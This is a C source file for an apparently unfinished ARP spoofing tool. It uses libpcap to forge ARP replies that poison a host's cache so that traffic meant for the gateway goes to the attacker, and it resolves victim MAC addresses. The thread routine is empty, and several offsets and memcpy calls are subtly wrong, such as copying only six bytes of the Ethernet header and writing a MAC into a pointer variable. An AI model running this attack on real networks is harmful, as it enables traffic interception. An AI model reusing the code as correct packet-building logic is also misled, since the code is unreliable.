#include "arp_spoof.h"

int main(int argc, char *argv[]){
	char *interface;
	char *senderIP, *targetIP;
	int i;
	pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct threadArgs *args;

	if( argc < 4 ){
		usage( argv[0] );
	}

	interface = argv[1];
	handle = pcap_open_live( interface, BUFSIZ, 1, 1000, errbuf );
    if( handle == NULL ){
        fprintf( stderr, "Couldn't open device %s: %s\n", interface, errbuf );
        return -1;
    }

	for( i = 2; i + 1 < argc; i += 2 ){
		senderIP = argv[i];
		targetIP = argv[i+1];
		args = (struct threadArgs*)malloc(sizeof(struct threadArgs));

		args->handle = handle;
		if( inet_pton( AF_INET, senderIP, &(args->senderIP) ) != 1 ){
	        fprintf(stderr, "Invalid IP : %s\n", senderIP);
	        continue;
	    }
	    if( inet_pton( AF_INET, targetIP, &(args->targetIP) ) != 1 ){
	        fprintf(stderr, "Invalid IP : %s\n", targetIP);
	        continue;
	    }
	}

}

void arp_spoof(void *args){

}


int infectARP( struct macAddr *senderMAC, struct in_addr *senderIP, struct macAddr *myMAC, struct in_addr *gatewayIP, pcap_t *handle){
    struct ether_header etherHDR;
    struct arphdr       arpHDR;
    uint8_t *packet;
    uint32_t offset = 0;
    uint32_t packetSize;
    struct pcap_pkthdr *header;

    memcpy( etherHDR.ether_dhost, senderMAC, ETHER_ADDR_LEN );
    memcpy( etherHDR.ether_shost, myMAC, ETHER_ADDR_LEN );
    etherHDR.ether_type = htons(ETHERTYPE_ARP);

    arpHDR.ar_hrd = htons(ARPHRD_ETHER);
    arpHDR.ar_pro = htons(ETHERTYPE_IP);
    arpHDR.ar_hln = ETHER_ADDR_LEN;
    arpHDR.ar_pln = INET_ADDRLEN;
    arpHDR.ar_op  = htons(ARPOP_REPLY);

    packetSize = sizeof(etherHDR) + sizeof(arpHDR) + 2 * ETHER_ADDR_LEN + 2 * INET_ADDRLEN;
    packet = (uint8_t*)malloc( packetSize );

    memcpy( packet + offset, &etherHDR, ETHER_ADDR_LEN );
    offset += sizeof(etherHDR);
    memcpy( packet + offset, &arpHDR, sizeof(arpHDR) );
    offset += sizeof(arpHDR);
    memcpy( packet + offset, myMAC, ETHER_ADDR_LEN );
    offset += sizeof(struct macAddr);
    memcpy( packet + offset, gatewayIP, INET_ADDRLEN );
    offset += sizeof(struct in_addr);
    memcpy( packet + offset, senderMAC, ETHER_ADDR_LEN );
    offset += sizeof(struct macAddr);
    memcpy( packet + offset, senderIP, INET_ADDRLEN );

    if( pcap_sendpacket( handle, packet, packetSize ) ){
        exit(1);
    }

    return 0;
}

struct macAddr *resolveMyMAC( struct macAddr *myMAC, char *interface ){
#ifdef MACOSX  // Ref : https://stackoverflow.com/questions/10593736/mac-address-from-interface-on-os-x-c
    int         mib[6];
    size_t      len;
    char        *buf;
    unsigned char       *ptr;
    struct if_msghdr    *ifm;
    struct sockaddr_dl  *sdl;

    mib[0] = CTL_NET;
    mib[1] = AF_ROUTE;
    mib[2] = 0;
    mib[3] = AF_LINK;
    mib[4] = NET_RT_IFLIST;

    if ((mib[5] = if_nametoindex(interface)) == 0) {
        perror("if_nametoindex error");
        exit(2);
    }

    if (sysctl(mib, 6, NULL, &len, NULL, 0) < 0) {
        perror("sysctl 1 error");
        exit(3);
    }

    if ((buf = (char*)malloc(len)) == NULL) {
        perror("malloc error");
        exit(4);
    }

    if (sysctl(mib, 6, buf, &len, NULL, 0) < 0) {
        perror("sysctl 2 error");
        exit(5);
    }

    ifm = (struct if_msghdr *)buf;
    sdl = (struct sockaddr_dl *)(ifm + 1);
    ptr = (unsigned char *)LLADDR(sdl);

    memcpy( myMAC, ptr, ETHER_ADDR_LEN );
    return myMAC;
#endif
#ifndef MACOSX // Ref : https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program
    struct ifreq s;
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, interface);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        memcpy( &myMAC, s.ifr_addr.sa_data, ETHER_ADDR_LEN );
    }
    else{
        exit(1);
    }
    close(fd);
    return myMAC;

#endif
}

struct in_addr *resolveMyIP(struct in_addr *myIP, char *interface) // Ref : https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
{
    struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];

    if (getifaddrs(&ifaddr) == -1)
    {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }


    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
    {
        if (ifa->ifa_addr == NULL)
            continue;

        s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);

        if( (strcmp(ifa->ifa_name,interface)==0)&&( ifa->ifa_addr->sa_family==AF_INET) )
        {
            if (s != 0)
            {
                printf("getnameinfo() failed: %s\n", gai_strerror(s));
                exit(EXIT_FAILURE);
            }
            if( inet_pton( AF_INET, host, myIP ) == 1 ){
                return myIP;
            }
        }
    }

    freeifaddrs(ifaddr);

    return NULL;
}


struct macAddr *resolveSenderMAC( struct macAddr *senderMAC, struct macAddr *myMAC, struct in_addr *senderIP, struct in_addr *myIP, pcap_t *handle ){
    struct ether_header etherHDR, *retherHDR;
    struct arphdr       arpHDR, *rarpHDR;
    struct in_addr *rsenderIP;
    struct macAddr *rsenderMAC;
    uint8_t *packet;
    uint32_t offset = 0;
    uint32_t packetSize;
    struct pcap_pkthdr *header;
    const u_char *rcvdPacket;
    int result;

    memcpy( etherHDR.ether_dhost, "\xFF\xFF\xFF\xFF\xFF\xFF", ETHER_ADDR_LEN );
    memcpy( etherHDR.ether_shost, myMAC, ETHER_ADDR_LEN );
    etherHDR.ether_type = htons(ETHERTYPE_ARP);

    arpHDR.ar_hrd = htons(ARPHRD_ETHER);
    arpHDR.ar_pro = htons(ETHERTYPE_IP);
    arpHDR.ar_hln = ETHER_ADDR_LEN;
    arpHDR.ar_pln = INET_ADDRLEN;
    arpHDR.ar_op  = htons(ARPOP_REQUEST);

    packetSize = sizeof(etherHDR) + sizeof(arpHDR) + 2 * ETHER_ADDR_LEN + 2 * INET_ADDRLEN;
    packet = (uint8_t *)malloc( packetSize );

    memcpy( packet + offset, &etherHDR, ETHER_ADDR_LEN );
    offset += sizeof(etherHDR);
    memcpy( packet + offset, &arpHDR, sizeof(arpHDR) );
    offset += sizeof(arpHDR);
    memcpy( packet + offset, myMAC, ETHER_ADDR_LEN );
    offset += sizeof(struct macAddr);
    memcpy( packet + offset, myIP, INET_ADDRLEN );
    offset += sizeof(struct in_addr);
    memcpy( packet + offset, "\x00\x00\x00\x00\x00\x00", ETHER_ADDR_LEN );
    offset += sizeof(struct macAddr);
    memcpy( packet + offset, senderIP, INET_ADDRLEN );

    if( pcap_sendpacket( handle, packet, packetSize ) ){
        exit(1);
    }

    while(1){
        result = pcap_next_ex( handle, &header, &rcvdPacket );
        if( result < 0 ){
            exit(1);
        }
        else if( result == 0 ){
            if( pcap_sendpacket( handle, packet, packetSize ) ){
                exit(1);
            }
            continue;
        }


        retherHDR = (struct ether_header *)rcvdPacket;
        if( htons(retherHDR->ether_type) != ETHERTYPE_ARP ){
            continue;
        }

        rarpHDR = (struct arphdr*)((char *)retherHDR + ETHER_ADDR_LEN);
        if( !(htons(rarpHDR->ar_hrd) == ARPHRD_ETHER &&
                    htons(rarpHDR->ar_pro) == ETHERTYPE_IP &&
                    rarpHDR->ar_hln == ETHER_ADDR_LEN &&
                    rarpHDR->ar_pln == INET_ADDRLEN &&
                    htons(rarpHDR->ar_op) == ARPOP_REPLY) ){
            continue;
        }

        rsenderIP = (struct in_addr*)((char*)rarpHDR + sizeof(struct arphdr) + ETHER_ADDR_LEN );
        if(memcmp(rsenderIP, senderIP, INET_ADDRLEN)){
            continue;
        }

        rsenderMAC = (struct macAddr*)((char*)rarpHDR + sizeof(struct arphdr));
        memcpy( senderMAC, rsenderMAC, ETHER_ADDR_LEN );
        break;
    }

    return senderMAC;
}




void usage( char *progName ){
    printf( "Usage: %s <interface> <sender1 ip> <target1 ip> [ <sender2 ip> <target2 ip> ... ]\n", progName );
    exit(1);
}